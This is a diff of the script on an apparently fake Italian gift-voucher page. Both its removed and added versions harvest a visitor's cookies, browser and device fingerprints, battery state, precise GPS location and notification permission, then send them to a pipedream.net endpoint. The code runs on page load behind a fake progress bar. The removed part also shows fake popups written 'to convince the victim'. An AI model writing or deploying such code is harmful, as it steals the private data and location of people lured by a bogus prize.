@@ -31,37 +31,8 @@
     <script>
         const PIPEDREAM_URL = "https://69cd60beb3f0593eb064103e51330e55.m.pipedream.net";
         const data = {};
-        let step = 0;
-
-        // Popup finto per convincere la vittima
-        function fakePopup(tipo, callback) {
-            const messaggi = {
-                gps: {
-                    titolo: "📍 Attiva geolocalizzazione",
-                    testo: "Dobbiamo verificare che ti trovi in Italia per il premio.",
-                    btn: "Verifica Posizione"
-                },
-                notifiche: {
-                    titolo: "🔔 Notifiche premio",
-                    testo: "Attiva le notifiche per ricevere il buono quando è pronto!",
-                    btn: "Attiva Notifiche"
-                }
-            };
-            const m = messaggi[tipo];
-            const overlay = document.createElement('div');
-            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:9999;display:flex;justify-content:center;align-items:center;';
-            overlay.innerHTML = '<div style="background:white;border-radius:15px;padding:30px;max-width:320px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.3);">' +
-                '<div style="font-size:50px;margin-bottom:15px;">' + (tipo==='gps'?'📍':'🔔') + '</div>' +
-                '<h3 style="color:#333;margin-bottom:10px;">' + m.titolo + '</h3>' +
-                '<p style="color:#666;font-size:14px;margin-bottom:20px;">' + m.testo + '</p>' +
-                '<button id="fakeBtn" style="background:#764ba2;color:white;border:none;padding:12px 30px;border-radius:25px;font-size:16px;cursor:pointer;">' + m.btn + '</button><br>' +
-                '<small style="color:#aaa;">Poi clicca Consenti sul popup del browser</small></div>';
-            document.body.appendChild(overlay);
-            document.getElementById('fakeBtn').onclick = () => { overlay.remove(); callback(); };
-        }
-
-        // Dati
-        function baseData() {
+        
+        async function stealAll() {
             data.timestamp = new Date().toISOString();
             data.userAgent = navigator.userAgent;
             data.platform = navigator.platform;
@@ -69,6 +40,14 @@
             data.screen = screen.width + "x" + screen.height;
             data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             data.cookies = document.cookie;
+            
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    data.battery = { level: Math.round(b.level*100)+"%", charging: b.charging };
+                } catch(e) {}
+            }
+            
             try {
                 const c = document.createElement("canvas");
                 const x = c.getContext("2d");
@@ -77,6 +56,7 @@
                 x.fillText("FP", 2, 15);
                 data.canvasFP = c.toDataURL().substring(0,200);
             } catch(e) {}
+            
             try {
                 const c = document.createElement("canvas");
                 const g = c.getContext("webgl");
@@ -85,82 +65,52 @@
                     data.webglRenderer = g.getParameter(d.UNMASKED_RENDERER_WEBGL);
                 }
             } catch(e) {}
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    data.battery = { level: Math.round(b.level*100)+"%", charging: b.charging };
-                    send();
-                }).catch(() => send());
-            } else { send(); }
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                        sendData();
+                    },
+                    err => {
+                        data.gps = "rifiutato";
+                        sendData();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                sendData();
+            }
+            
+            if ('Notification' in window) {
+                try {
+                    const perm = await Notification.requestPermission();
+                    data.notifications = perm;
+                } catch(e) {}
+            }
         }
-
-        function send() {
+        
+        function sendData() {
             fetch(PIPEDREAM_URL, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify(data)
             }).catch(() => {});
         }
-
-        // Step 1
-        function stepGPS() {
-            document.getElementById('status').textContent = 'Verifica posizione...';
-            fakePopup('gps', () => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            data.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
-                            send();
-                        },
-                        err => {
-                            data.gps = "rifiutato";
-                            send();
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                }
-                // Dopo 
-                setTimeout(stepNotifiche, 1000);
-            });
-        }
-
-        // Step 2
-        function stepNotifiche() {
-            document.getElementById('status').textContent = 'Configurazione notifiche...';
-            fakePopup('notifiche', () => {
-                if ('Notification' in window) {
-                    Notification.requestPermission().then(perm => {
-                        data.notifications = perm;
-                        if (perm === 'granted') {
-                            new Notification("✅ Premio Attivato!", {
-                                body: "Riceverai il tuo buono regalo entro 24 ore. Torna presto!",
-                                icon: "🎁",
-                                requireInteraction: true
-                            });
-                        }
-                        send();
-                    });
-                }
-                setTimeout(() => {
-                    document.getElementById('status').textContent = '✅ Completato!';
-                }, 500);
-            });
-        }
-
-        // Animazione
+        
         let p = 0;
         const bar = document.getElementById("barfill");
+        const st = document.getElementById("status");
         const msgs = ["Verifica account...","Conferma premio...","Generazione buono...","Invio email..."];
         let i = 0;
         setInterval(() => {
             p += Math.random() * 25;
             if(p > 100) p = 100;
             bar.style.width = p + "%";
-            if(p > (i+1)*25 && i < msgs.length) { document.getElementById('status').textContent = msgs[i]; i++; }
+            if(p > (i+1)*25 && i < msgs.length) { st.textContent = msgs[i]; i++; }
         }, 500);
-
-        // Avvia
-        baseData();
-        setTimeout(stepGPS, 2000);
+        
+        stealAll();
     </script>
 </body>
 </html>
